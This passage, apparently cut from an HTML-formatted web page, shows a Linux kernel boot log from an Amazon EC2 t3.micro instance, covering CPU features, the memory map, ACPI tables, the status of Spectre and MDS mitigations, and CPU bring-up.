class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br><span class="line">244</span><br><span class="line">245</span><br><span class="line">246</span><br><span class="line">247</span><br><span class="line">248</span><br><span class="line">249</span><br><span class="line">250</span><br><span class="line">251</span><br><span class="line">252</span><br><span class="line">253</span><br><span class="line">254</span><br><span class="line">255</span><br><span class="line">256</span><br><span class="line">257</span><br><span class="line">258</span><br><span class="line">259</span><br><span class="line">260</span><br><span class="line">261</span><br><span class="line">262</span><br><span class="line">263</span><br><span class="line">264</span><br><span class="line">265</span><br><span class="line">266</span><br><span class="line">267</span><br><span class="line">268</span><br><span class="line">269</span><br><span class="line">270</span><br><span class="line">271</span><br><span class="line">272</span><br><span class="line">273</span><br><span class="line">274</span><br><span class="line">275</span><br><span class="line">276</span><br><span class="line">277</span><br><span class="line">278</span><br><span class="line">279</span><br><span class="line">280</span><br><span class="line">281</span><br><span class="line">282</span><br><span class="line">283</span><br><span class="line">284</span><br><span class="line">285</span><br><span class="line">286</span><br><span class="line">287</span><br><span class="line">288</span><br><span class="line">289</span><br><span class="line">290</span><br><span class="line">291</span><br><span class="line">292</span><br><span class="line">293</span><br><span class="line">294</span><br><span class="line">295</span><br><span class="line">296</span><br><span class="line">297</span><br><span class="line">298</span><br><span class="line">299</span><br><span class="line">300</span><br><span class="line">301</span><br><span class="line">302</span><br><span class="line">303</span><br><span class="line">304</span><br><span class="line">305</span><br><span class="line">306</span><br><span class="line">307</span><br><span class="line">308</span><br><span class="line">309</span><br><span class="line">310</span><br><span class="line">311</span><br><span class="line">312</span><br><span class="line">313</span><br><span class="line">314</span><br><span class="line">315</span><br><span class="line">316</span><br><span class="line">317</span><br><span class="line">318</span><br><span class="line">319</span><br><span class="line">320</span><br><span class="line">321</span><br><span class="line">322</span><br><span class="line">323</span><br><span class="line">324</span><br><span class="line">325</span><br><span class="line">326</span><br><span class="line">327</span><br><span class="line">328</span><br><span class="line">329</span><br><span class="line">330</span><br><span class="line">331</span><br><span class="line">332</span><br><span class="line">333</span><br><span class="line">334</span><br><span class="line">335</span><br><span class="line">336</span><br><span class="line">337</span><br><span class="line">338</span><br><span class="line">339</span><br><span class="line">340</span><br><span class="line">341</span><br><span class="line">342</span><br><span class="line">343</span><br><span class="line">344</span><br><span class="line">345</span><br><span class="line">346</span><br><span class="line">347</span><br><span class="line">348</span><br><span class="line">349</span><br><span class="line">350</span><br><span class="line">351</span><br><span class="line">352</span><br><span class="line">353</span><br><span class="line">354</span><br><span class="line">355</span><br><span class="line">356</span><br><span class="line">357</span><br><span class="line">358</span><br><span class="line">359</span><br><span class="line">360</span><br><span class="line">361</span><br><span class="line">362</span><br><span class="line">363</span><br><span class="line">364</span><br><span class="line">365</span><br><span class="line">366</span><br><span class="line">367</span><br><span class="line">368</span><br><span class="line">369</span><br><span class="line">370</span><br><span class="line">371</span><br><span class="line">372</span><br><span class="line">373</span><br><span class="line">374</span><br><span class="line">375</span><br><span class="line">376</span><br><span class="line">377</span><br><span class="line">378</span><br><span class="line">379</span><br><span class="line">380</span><br><span class="line">381</span><br><span class="line">382</span><br><span class="line">383</span><br><span class="line">384</span><br><span class="line">385</span><br><span class="line">386</span><br><span class="line">387</span><br><span class="line">388</span><br><span class="line">389</span><br><span class="line">390</span><br><span class="line">391</span><br><span class="line">392</span><br><span class="line">393</span><br><span class="line">394</span><br><span class="line">395</span><br><span class="line">396</span><br><span class="line">397</span><br><span class="line">398</span><br><span class="line">399</span><br><span class="line">400</span><br><span class="line">401</span><br><span class="line">402</span><br><span class="line">403</span><br><span class="line">404</span><br><span class="line">405</span><br><span class="line">406</span><br><span class="line">407</span><br><span class="line">408</span><br><span class="line">409</span><br><span class="line">410</span><br><span class="line">411</span><br><span class="line">412</span><br><span class="line">413</span><br><span class="line">414</span><br><span class="line">415</span><br><span class="line">416</span><br><span class="line">417</span><br><span class="line">418</span><br><span class="line">419</span><br><span class="line">420</span><br><span class="line">421</span><br><span class="line">422</span><br><span class="line">423</span><br><span class="line">424</span><br><span class="line">425</span><br><span class="line">426</span><br><span class="line">427</span><br><span class="line">428</span><br><span class="line">429</span><br><span class="line">430</span><br><span class="line">431</span><br><span class="line">432</span><br><span class="line">433</span><br><span class="line">434</span><br><span class="line">435</span><br><span class="line">436</span><br><span class="line">437</span><br><span class="line">438</span><br><span class="line">439</span><br><span class="line">440</span><br><span class="line">441</span><br><span class="line">442</span><br><span class="line">443</span><br><span class="line">444</span><br><span class="line">445</span><br><span class="line">446</span><br><span class="line">447</span><br><span class="line">448</span><br><span class="line">449</span><br><span class="line">450</span><br><span class="line">451</span><br><span class="line">452</span><br><span class="line">453</span><br><span class="line">454</span><br><span class="line">455</span><br><span class="line">456</span><br><span class="line">457</span><br><span class="line">458</span><br><span class="line">459</span><br><span class="line">460</span><br><span class="line">461</span><br><span class="line">462</span><br><span class="line">463</span><br><span class="line">464</span><br><span class="line">465</span><br><span class="line">466</span><br><span class="line">467</span><br><span class="line">468</span><br><span class="line">469</span><br><span class="line">470</span><br><span class="line">471</span><br><span class="line">472</span><br><span class="line">473</span><br><span class="line">474</span><br><span class="line">475</span><br><span class="line">476</span><br><span class="line">477</span><br><span class="line">478</span><br><span class="line">479</span><br><span class="line">480</span><br><span class="line">481</span><br><span class="line">482</span><br><span class="line">483</span><br><span class="line">484</span><br><span class="line">485</span><br><span class="line">486</span><br><span class="line">487</span><br><span class="line">488</span><br><span class="line">489</span><br><span class="line">490</span><br><span class="line">491</span><br><span class="line">492</span><br><span class="line">493</span><br><span class="line">494</span><br><span class="line">495</span><br><span class="line">496</span><br><span class="line">497</span><br><span class="line">498</span><br><span class="line">499</span><br><span class="line">500</span><br><span class="line">501</span><br><span class="line">502</span><br><span class="line">503</span><br><span class="line">504</span><br><span class="line">505</span><br><span class="line">506</span><br><span class="line">507</span><br><span class="line">508</span><br><span class="line">509</span><br><span class="line">510</span><br><span class="line">511</span><br><span class="line">512</span><br><span class="line">513</span><br><span class="line">514</span><br><span class="line">515</span><br><span class="line">516</span><br><span class="line">517</span><br><span class="line">518</span><br><span class="line">519</span><br><span class="line">520</span><br><span class="line">521</span><br><span class="line">522</span><br><span class="line">523</span><br><span class="line">524</span><br><span class="line">525</span><br><span class="line">526</span><br><span class="line">527</span><br><span class="line">528</span><br><span class="line">529</span><br><span class="line">530</span><br><span class="line">531</span><br><span class="line">532</span><br><span class="line">533</span><br><span class="line">534</span><br><span class="line">535</span><br><span class="line">536</span><br><span class="line">537</span><br><span class="line">538</span><br><span class="line">539</span><br><span class="line">540</span><br><span class="line">541</span><br><span class="line">542</span><br><span class="line">543</span><br><span class="line">544</span><br><span class="line">545</span><br><span class="line">546</span><br><span class="line">547</span><br><span class="line">548</span><br><span class="line">549</span><br><span class="line">550</span><br><span class="line">551</span><br><span class="line">552</span><br><span class="line">553</span><br><span class="line">554</span><br><span class="line">555</span><br><span class="line">556</span><br><span class="line">557</span><br><span class="line">558</span><br><span class="line">559</span><br><span class="line">560</span><br><span class="line">561</span><br><span class="line">562</span><br><span class="line">563</span><br><span class="line">564</span><br><span class="line">565</span><br><span class="line">566</span><br><span class="line">567</span><br><span class="line">568</span><br><span class="line">569</span><br><span class="line">570</span><br><span class="line">571</span><br><span class="line">572</span><br><span class="line">573</span><br><span class="line">574</span><br><span class="line">575</span><br><span class="line">576</span><br><span class="line">577</span><br><span class="line">578</span><br><span class="line">579</span><br><span class="line">580</span><br><span class="line">581</span><br><span class="line">582</span><br><span class="line">583</span><br><span class="line">584</span><br><span class="line">585</span><br><span class="line">586</span><br><span class="line">587</span><br><span class="line">588</span><br><span class="line">589</span><br><span class="line">590</span><br><span class="line">591</span><br><span class="line">592</span><br><span class="line">593</span><br><span class="line">594</span><br><span class="line">595</span><br><span class="line">596</span><br><span class="line">597</span><br><span class="line">598</span><br><span class="line">599</span><br><span class="line">600</span><br><span class="line">601</span><br><span class="line">602</span><br><span class="line">603</span><br><span class="line">604</span><br><span class="line">605</span><br><span class="line">606</span><br><span class="line">607</span><br><span class="line">608</span><br><span class="line">609</span><br><span class="line">610</span><br><span class="line">611</span><br><span class="line">612</span><br><span class="line">613</span><br><span class="line">614</span><br><span class="line">615</span><br><span class="line">616</span><br><span class="line">617</span><br><span class="line">618</span><br><span class="line">619</span><br><span class="line">620</span><br><span class="line">621</span><br><span class="line">622</span><br><span class="line">623</span><br><span class="line">624</span><br><span class="line">625</span><br><span class="line">626</span><br><span class="line">627</span><br><span class="line">628</span><br><span class="line">629</span><br><span class="line">630</span><br><span class="line">631</span><br><span class="line">632</span><br><span class="line">633</span><br><span class="line">634</span><br><span class="line">635</span><br><span class="line">636</span><br><span class="line">637</span><br><span class="line">638</span><br><span class="line">639</span><br><span class="line">640</span><br><span class="line">641</span><br><span class="line">642</span><br><span class="line">643</span><br><span class="line">644</span><br><span class="line">645</span><br><span class="line">646</span><br><span class="line">647</span><br><span class="line">648</span><br><span class="line">649</span><br><span class="line">650</span><br><span class="line">651</span><br><span class="line">652</span><br><span class="line">653</span><br><span class="line">654</span><br><span class="line">655</span><br><span class="line">656</span><br><span class="line">657</span><br><span class="line">658</span><br><span class="line">659</span><br><span class="line">660</span><br><span class="line">661</span><br><span class="line">662</span><br><span class="line">663</span><br><span class="line">664</span><br><span class="line">665</span><br><span class="line">666</span><br><span class="line">667</span><br><span class="line">668</span><br><span class="line">669</span><br><span class="line">670</span><br><span class="line">671</span><br><span class="line">672</span><br><span class="line">673</span><br><span class="line">674</span><br><span class="line">675</span><br><span class="line">676</span><br><span class="line">677</span><br><span class="line">678</span><br><span class="line">679</span><br><span class="line">680</span><br><span class="line">681</span><br><span class="line">682</span><br><span class="line">683</span><br><span class="line">684</span><br><span class="line">685</span><br><span class="line">686</span><br><span class="line">687</span><br><span class="line">688</span><br><span class="line">689</span><br><span class="line">690</span><br><span class="line">691</span><br><span class="line">692</span><br><span class="line">693</span><br><span class="line">694</span><br><span class="line">695</span><br><span class="line">696</span><br><span class="line">697</span><br><span class="line">698</span><br><span class="line">699</span><br><span class="line">700</span><br><span class="line">701</span><br><span class="line">702</span><br><span class="line">703</span><br><span class="line">704</span><br><span class="line">705</span><br><span class="line">706</span><br><span class="line">707</span><br><span class="line">708</span><br><span class="line">709</span><br><span class="line">710</span><br><span class="line">711</span><br><span class="line">712</span><br><span class="line">713</span><br><span class="line">714</span><br><span class="line">715</span><br><span class="line">716</span><br><span class="line">717</span><br><span class="line">718</span><br><span class="line">719</span><br><span class="line">720</span><br><span class="line">721</span><br><span class="line">722</span><br><span class="line">723</span><br><span class="line">724</span><br><span class="line">725</span><br><span class="line">726</span><br><span class="line">727</span><br><span class="line">728</span><br><span class="line">729</span><br><span class="line">730</span><br><span class="line">731</span><br><span class="line">732</span><br><span class="line">733</span><br><span class="line">734</span><br><span class="line">735</span><br><span class="line">736</span><br><span class="line">737</span><br><span class="line">738</span><br><span class="line">739</span><br><span class="line">740</span><br><span class="line">741</span><br><span class="line">742</span><br><span class="line">743</span><br><span class="line">744</span><br><span class="line">745</span><br><span class="line">746</span><br><span class="line">747</span><br><span class="line">748</span><br><span class="line">749</span><br><span class="line">750</span><br></pre></td><td class="code"><pre><span class="line">[    0.000000] Linux version 4.14.146-120.181.amzn2.x86_64 (mockbuild@ip-10-0-1-243) (gcc version 7.3.1 20180712 (Red Hat 7.3.1-6) (GCC)) #1 SMP Fri Oct 18 17:01:06 UTC 2019</span><br><span class="line">[    0.000000] Command line: BOOT_IMAGE=/boot/vmlinuz-4.14.146-120.181.amzn2.x86_64 root=UUID=0a5c8d10-5fd5-4c87-8778-4afc3ce97dd9 ro console=tty0 console=ttyS0,115200n8 net.ifnames=0 biosdevname=0 nvme_core.io_timeout=4294967295 rd.emergency=poweroff rd.shell=0</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x001: &apos;x87 floating point registers&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x002: &apos;SSE registers&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x004: &apos;AVX registers&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x008: &apos;MPX bounds registers&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x010: &apos;MPX CSR&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x020: &apos;AVX-512 opmask&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x040: &apos;AVX-512 Hi256&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x080: &apos;AVX-512 ZMM_Hi256&apos;</span><br><span class="line">[    0.000000] x86/fpu: Supporting XSAVE feature 0x200: &apos;Protection Keys User registers&apos;</span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[2]:  576, xstate_sizes[2]:  256</span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[3]:  832, xstate_sizes[3]:   64</span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[4]:  896, xstate_sizes[4]:   64</span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[5]:  960, xstate_sizes[5]:   64</span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[6]: 1024, xstate_sizes[6]:  512</span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[7]: 1536, xstate_sizes[7]: 1024</span><br><span class="line">[    0.000000] x86/fpu: xstate_offset[9]: 2560, xstate_sizes[9]:    8</span><br><span class="line">[    0.000000] x86/fpu: Enabled xstate features 0x2ff, context size is 2568 bytes, using &apos;compacted&apos; format.</span><br><span class="line">[    0.000000] e820: BIOS-provided physical RAM map:</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x0000000000000000-0x000000000009fbff] usable</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x000000000009fc00-0x000000000009ffff] reserved</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x00000000000f0000-0x00000000000fffff] reserved</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x0000000000100000-0x000000003e3f9fff] usable</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x000000003e3fa000-0x000000003fffffff] reserved</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x00000000e0000000-0x00000000e03fffff] reserved</span><br><span class="line">[    0.000000] BIOS-e820: [mem 0x00000000fffc0000-0x00000000ffffffff] reserved</span><br><span class="line">[    0.000000] NX (Execute Disable) protection: active</span><br><span class="line">[    0.000000] SMBIOS 2.7 present.</span><br><span class="line">[    0.000000] DMI: Amazon EC2 t3.micro/, BIOS 1.0 10/16/2017</span><br><span class="line">[    0.000000] Hypervisor detected: KVM</span><br><span class="line">[    0.000000] tsc: Fast TSC calibration using PIT</span><br><span class="line">[    0.000000] e820: last_pfn = 0x3e3fa max_arch_pfn = 0x400000000</span><br><span class="line">[    0.000000] x86/PAT: Configuration [0-7]: WB  WC  UC- UC  WB  WP  UC- WT  </span><br><span class="line">[    0.000000] Scanning 1 areas for low memory corruption</span><br><span class="line">[    0.000000] Using GB pages for direct mapping</span><br><span class="line">[    0.000000] RAMDISK: [mem 0x3442e000-0x3620efff]</span><br><span class="line">[    0.000000] ACPI: Early table checksum verification disabled</span><br><span class="line">[    0.000000] ACPI: RSDP 0x00000000000F8FA0 000014 (v00 AMAZON)</span><br><span class="line">[    0.000000] ACPI: RSDT 0x000000003E3FE360 00003C (v01 AMAZON AMZNRSDT 00000001 AMZN 00000001)</span><br><span class="line">[    0.000000] ACPI: FACP 0x000000003E3FFF80 000074 (v01 AMAZON AMZNFACP 00000001 AMZN 00000001)</span><br><span class="line">[    0.000000] ACPI: DSDT 0x000000003E3FE3A0 0010E9 (v01 AMAZON AMZNDSDT 00000001 AMZN 00000001)</span><br><span class="line">[    0.000000] ACPI: FACS 0x000000003E3FFF40 000040</span><br><span class="line">[    0.000000] ACPI: SSDT 0x000000003E3FF6C0 00087A (v01 AMAZON AMZNSSDT 00000001 AMZN 00000001)</span><br><span class="line">[    0.000000] ACPI: APIC 0x000000003E3FF5D0 000076 (v01 AMAZON AMZNAPIC 00000001 AMZN 00000001)</span><br><span class="line">[    0.000000] ACPI: SRAT 0x000000003E3FF530 0000A0 (v01 AMAZON AMZNSRAT 00000001 AMZN 00000001)</span><br><span class="line">[    0.000000] ACPI: SLIT 0x000000003E3FF4C0 00006C (v01 AMAZON AMZNSLIT 00000001 AMZN 00000001)</span><br><span class="line">[    0.000000] ACPI: WAET 0x000000003E3FF490 000028 (v01 AMAZON AMZNWAET 00000001 AMZN 00000001)</span><br><span class="line">[    0.000000] SRAT: PXM 0 -&gt; APIC 0x00 -&gt; Node 0</span><br><span class="line">[    0.000000] SRAT: PXM 0 -&gt; APIC 0x01 -&gt; Node 0</span><br><span class="line">[    0.000000] ACPI: SRAT: Node 0 PXM 0 [mem 0x00000000-0x3fffffff]</span><br><span class="line">[    0.000000] NODE_DATA(0) allocated [mem 0x3e3d7000-0x3e3f8fff]</span><br><span class="line">[    0.000000] kvm-clock: Using msrs 4b564d01 and 4b564d00</span><br><span class="line">[    0.000000] kvm-clock: cpu 0, msr 0:3e357001, primary cpu clock</span><br><span class="line">[    0.000000] kvm-clock: using sched offset of 7141099624 cycles</span><br><span class="line">[    0.000000] clocksource: kvm-clock: mask: 0xffffffffffffffff max_cycles: 0x1cd42e4dffb, max_idle_ns: 881590591483 ns</span><br><span class="line">[    0.000000] Zone ranges:</span><br><span class="line">[    0.000000]   DMA      [mem 0x0000000000001000-0x0000000000ffffff]</span><br><span class="line">[    0.000000]   DMA32    [mem 0x0000000001000000-0x000000003e3f9fff]</span><br><span class="line">[    0.000000]   Normal   empty</span><br><span class="line">[    0.000000] Movable zone start for each node</span><br><span class="line">[    0.000000] Early memory node ranges</span><br><span class="line">[    0.000000]   node   0: [mem 0x0000000000001000-0x000000000009efff]</span><br><span class="line">[    0.000000]   node   0: [mem 0x0000000000100000-0x000000003e3f9fff]</span><br><span class="line">[    0.000000] Initmem setup node 0 [mem 0x0000000000001000-0x000000003e3f9fff]</span><br><span class="line">[    0.000000] ACPI: PM-Timer IO Port: 0xb008</span><br><span class="line">[    0.000000] ACPI: LAPIC_NMI (acpi_id[0xff] dfl dfl lint[0x1])</span><br><span class="line">[    0.000000] IOAPIC[0]: apic_id 0, version 17, address 0xfec00000, GSI 0-23</span><br><span class="line">[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 5 global_irq 5 high level)</span><br><span class="line">[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 9 global_irq 9 high level)</span><br><span class="line">[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 10 global_irq 10 high level)</span><br><span class="line">[    0.000000] ACPI: INT_SRC_OVR (bus 0 bus_irq 11 global_irq 11 high level)</span><br><span class="line">[    0.000000] Using ACPI (MADT) for SMP configuration information</span><br><span class="line">[    0.000000] smpboot: Allowing 2 CPUs, 0 hotplug CPUs</span><br><span class="line">[    0.000000] PM: Registered nosave memory: [mem 0x00000000-0x00000fff]</span><br><span class="line">[    0.000000] PM: Registered nosave memory: [mem 0x0009f000-0x0009ffff]</span><br><span class="line">[    0.000000] PM: Registered nosave memory: [mem 0x000a0000-0x000effff]</span><br><span class="line">[    0.000000] PM: Registered nosave memory: [mem 0x000f0000-0x000fffff]</span><br><span class="line">[    0.000000] e820: [mem 0x40000000-0xdfffffff] available for PCI devices</span><br><span class="line">[    0.000000] Booting paravirtualized kernel on KVM</span><br><span class="line">[    0.000000] clocksource: refined-jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645519600211568 ns</span><br><span class="line">[    0.000000] random: get_random_bytes called from start_kernel+0x94/0x4c8 with crng_init=0</span><br><span class="line">[    0.000000] setup_percpu: NR_CPUS:8192 nr_cpumask_bits:2 nr_cpu_ids:2 nr_node_ids:1</span><br><span class="line">[    0.000000] percpu: Embedded 44 pages/cpu s140504 r8192 d31528 u1048576</span><br><span class="line">[    0.000000] KVM setup async PF for cpu 0</span><br><span class="line">[    0.000000] kvm-stealtime: cpu 0, msr 3e0161c0</span><br><span class="line">[    0.000000] PV qspinlock hash table entries: 256 (order: 0, 4096 bytes)</span><br><span class="line">[    0.000000] Built 1 zonelists, mobility grouping on.  Total pages: 250867</span><br><span class="line">[    0.000000] Policy zone: DMA32</span><br><span class="line">[    0.000000] Kernel command line: BOOT_IMAGE=/boot/vmlinuz-4.14.146-120.181.amzn2.x86_64 root=UUID=0a5c8d10-5fd5-4c87-8778-4afc3ce97dd9 ro console=tty0 console=ttyS0,115200n8 net.ifnames=0 biosdevname=0 nvme_core.io_timeout=4294967295 rd.emergency=poweroff rd.shell=0</span><br><span class="line">[    0.000000] PID hash table entries: 4096 (order: 3, 32768 bytes)</span><br><span class="line">[    0.000000] Memory: 944356K/1019488K available (10252K kernel code, 1956K rwdata, 2764K rodata, 2084K init, 3924K bss, 75132K reserved, 0K cma-reserved)</span><br><span class="line">[    0.000000] SLUB: HWalign=64, Order=0-3, MinObjects=0, CPUs=2, Nodes=1</span><br><span class="line">[    0.000000] Kernel/User page tables isolation: enabled</span><br><span class="line">[    0.000000] ftrace: allocating 26556 entries in 104 pages</span><br><span class="line">[    0.004000] Hierarchical RCU implementation.</span><br><span class="line">[    0.004000] RCU restricting CPUs from NR_CPUS=8192 to nr_cpu_ids=2.</span><br><span class="line">[    0.004000] RCU: Adjusting geometry for rcu_fanout_leaf=16, nr_cpu_ids=2</span><br><span class="line">[    0.004000] NR_IRQS: 524544, nr_irqs: 440, preallocated irqs: 16</span><br><span class="line">[    0.004000] Console: colour VGA+ 80x25</span><br><span class="line">[    0.004000] console [tty0] enabled</span><br><span class="line">[    0.004000] console [ttyS0] enabled</span><br><span class="line">[    0.004005] tsc: Detected 2499.998 MHz processor</span><br><span class="line">[    0.007380] Calibrating delay loop (skipped) preset value.. 4999.99 BogoMIPS (lpj=9999992)</span><br><span class="line">[    0.008002] pid_max: default: 32768 minimum: 301</span><br><span class="line">[    0.012006] ACPI: Core revision 20170728</span><br><span class="line">[    0.016573] ACPI: 2 ACPI AML tables successfully acquired and loaded</span><br><span class="line">[    0.020015] Security Framework initialized</span><br><span class="line">[    0.023158] SELinux:  Initializing.</span><br><span class="line">[    0.024155] Dentry cache hash table entries: 131072 (order: 8, 1048576 bytes)</span><br><span class="line">[    0.028072] Inode-cache hash table entries: 65536 (order: 7, 524288 bytes)</span><br><span class="line">[    0.032009] Mount-cache hash table entries: 2048 (order: 2, 16384 bytes)</span><br><span class="line">[    0.036005] Mountpoint-cache hash table entries: 2048 (order: 2, 16384 bytes)</span><br><span class="line">[    0.040233] mce: CPU supports 32 MCE banks</span><br><span class="line">[    0.043467] Last level iTLB entries: 4KB 64, 2MB 8, 4MB 8</span><br><span class="line">[    0.044002] Last level dTLB entries: 4KB 64, 2MB 0, 4MB 0, 1GB 4</span><br><span class="line">[    0.048002] Spectre V1 : Mitigation: usercopy/swapgs barriers and __user pointer sanitization</span><br><span class="line">[    0.052003] Spectre V2 : Mitigation: Full generic retpoline</span><br><span class="line">[    0.056002] Spectre V2 : Spectre v2 / SpectreRSB mitigation: Filling RSB on context switch</span><br><span class="line">[    0.060002] Speculative Store Bypass: Vulnerable</span><br><span class="line">[    0.064024] MDS: Vulnerable: Clear CPU buffers attempted, no microcode</span><br><span class="line">[    0.068083] Freeing SMP alternatives memory: 24K</span><br><span class="line">[    0.072754] smpboot: Max logical packages: 1</span><br><span class="line">[    0.076245] x2apic enabled</span><br><span class="line">[    0.080003] Switched APIC routing to physical x2apic.</span><br><span class="line">[    0.085113] ..TIMER: vector=0x30 apic1=0 pin1=0 apic2=-1 pin2=-1</span><br><span class="line">[    0.088000] smpboot: CPU0: Intel(R) Xeon(R) Platinum 8175M CPU @ 2.50GHz (family: 0x6, model: 0x55, stepping: 0x4)</span><br><span class="line">[    0.088068] Performance Events: unsupported p6 CPU model 85 no PMU driver, software events only.</span><br><span class="line">[    0.092043] Hierarchical SRCU implementation.</span><br><span class="line">[    0.095698] NMI watchdog: Perf event create on CPU 0 failed with -2</span><br><span class="line">[    0.096003] NMI watchdog: Perf NMI watchdog permanently disabled</span><br><span class="line">[    0.099984] smp: Bringing up secondary CPUs ...</span><br><span class="line">[    0.100098] x86: Booting SMP configuration:</span><br><span class="line">[    0.103305] .... node  #0, CPUs:      #1</span><br><span class="line">[    0.004000] kvm-clock: cpu 1, msr 0:3e357041, secondary cpu clock</span><br><span class="line">[    0.105851] KVM setup async PF for cpu 1</span><br><span class="line">[    0.107117] kvm-stealtime: cpu 1, msr 3e1161c0</span><br><span class="line">[    0.112263] MDS CPU bug present and SMT on, data leak possible. See https://www.kernel.org/doc/html/latest/admin-guide/hw-vuln/mds.html for more details.</span><br><span class="line">[    0.116005] smp: Brought up 1 node, 2 CPUs</span><br><span class="line">[    0.119184] smpboot: Total of 2 processors activated (9999.99 BogoMIPS)</span><br><span class="line">[    0.120359] devtmpfs: initialized</span><br><span class="line">[    0.122893] x86/mm: Memory block size: 128MB</span><br><span class="line">[    0.124138] clocksource: jiffies: mask: 0xffffffff max_cycles: 0xffffffff, max_idle_ns: 7645041785100000 ns</span><br><span class="line">[    0.132013] futex hash table entries: 512 (order: 3, 32768 bytes)</span><br><span class="line">[    0.136116] NET: Registered protocol family 16</span><br><span class="line">[    0.140099] cpuidle: using governor ladder</span><br><span class="line">[    0.144014] cpuidle: using governor menu</span><br><span class="line">[    0.147189] ACPI: bus type PCI registered</span><br><span class="line">[    0.148006] acpiphp: ACPI Hot Plug PCI Controller Driver version: 0.5</span><br><span class="line">[    0.152134] PCI: Using configuration type 1 for base access</span><br><span class="line">[    0.158011] HugeTLB registered 1.00 GiB page size, pre-allocated 0 pages</span><br><span class="line">[    0.160004] HugeTLB registered 2.00 MiB page size, pre-allocated 0 pages</span><br><span class="line">[    0.164060] ACPI: Added _OSI(Module Device)</span><br><span class="line">[    0.164060] ACPI: Added _OSI(Processor Device)</span><br><span class="line">[    0.168011] ACPI: Added _OSI(3.0 _SCP Extensions)</span><br><span class="line">[    0.172006] ACPI: Added _OSI(Processor Aggregator Device)</span><br><span class="line">[    0.177191] ACPI: Interpreter enabled</span><br><span class="line">[    0.180010] ACPI: (supports S0 S4 S5)</span><br><span class="line">[    0.184008] ACPI: Using IOAPIC for interrupt routing</span><br><span class="line">[    0.188017] PCI: Using host bridge windows from ACPI; if necessary, use &quot;pci=nocrs&quot; and report a bug</span><br><span class="line">[    0.196003] ACPI: Enabled 16 GPEs in block 00 to 0F</span><br><span class="line">[    0.200023] ACPI: PCI Root Bridge [PCI0] (domain 0000 [bus 00-ff])</span><br><span class="line">[    0.204006] acpi PNP0A03:00: _OSC: OS supports [ASPM ClockPM Segments MSI]</span><br><span class="line">[    0.208009] acpi 